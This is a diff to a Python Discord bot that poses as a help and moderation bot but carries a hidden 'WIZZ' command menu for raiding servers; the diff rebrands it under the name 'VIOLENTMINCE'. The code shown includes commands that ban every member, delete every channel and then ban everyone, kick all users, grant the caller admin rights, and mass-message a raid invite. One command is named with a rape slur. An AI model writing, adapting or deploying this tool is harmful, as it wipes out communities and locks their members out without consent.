@@ -7,14 +7,14 @@ import asyncio
 import time
 import logging
 
-client = commands.Bot(command_prefix=';')
+client = commands.Bot(command_prefix='$')
 
 client.remove_command("help")
 
 
 @client.event
 async def on_ready():
-    print ("BEST NEW DISCORD NUKE BOT")
+    print ("VIOLENTMINCE WIZZING BOT")
 
 @client.event
 async def on_server_join(server):
@@ -35,6 +35,8 @@ async def help(ctx):
     embed.add_field(name='$info', value='Gives information of a user', inline=False)
     embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
     embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
+    embed.set_image(url='https://media.discordapp.net/attachments/766885584484171786/767893690735394846/image0.jpg')
+    embed.set_footer(text='Python V3 Bot Made By : VIOLENTMINCE')
     await member.send(embed=embed)
 
 @client.command(pass_context=True)
@@ -113,18 +115,19 @@ async def moderate(ctx):
     await channel.send(embed=embed)
 
 @client.command(pass_context=True)
-async def secret(ctx):
+async def WIZZ(ctx):
     member = ctx.message.author
     embed = discord.Embed(
         colour = discord.Colour.blue()
     )
 
-    embed.set_author(name='secret')
+    embed.set_author(name='VIOLENTMINCE WIZZING CMDS')
     embed.add_field(name='$g', value='Bans everybody from the server (bot needs banning perms and needs to have a higher role than users', inline=False)
     embed.add_field(name='$rape', value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)', inline=False)
     embed.add_field(name='$h', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
     embed.add_field(name='$dab', value='Gives you admin access (bot needs administrator)', inline=False)
     embed.add_field(name='$dm', value='Sends an invite link of the raid hub to everybody in the server', inline=False)
+    embed.set_image(url='https://media.discordapp.net/attachments/766885584484171786/767892942781546516/image0.jpg')
     await member.send(embed=embed)
 
 @client.command(pass_context=True)
@@ -158,14 +161,14 @@ async def rape(ctx):
             except:
                 pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel( 'RIP')
-        await channel.send( "U GOT WIZZED")
+        channel = await guild.create_text_channel( 'IsThatFamily')
+        await channel.send( "U GOT WIZZED BY VIOLENTMINCE")
         for member in list(ctx.message.guild.members):
             try:
                 await guild.ban(member)
                 print ("User " + member.name + " has been banned")
             except:
                 pass
-        print ("UR SERVER IS FUCKED UP")
+        print ("UR SERVER IS FUCKED UP BY VIOLENTMINCE LOL")
 
 client.run("tokeh here")
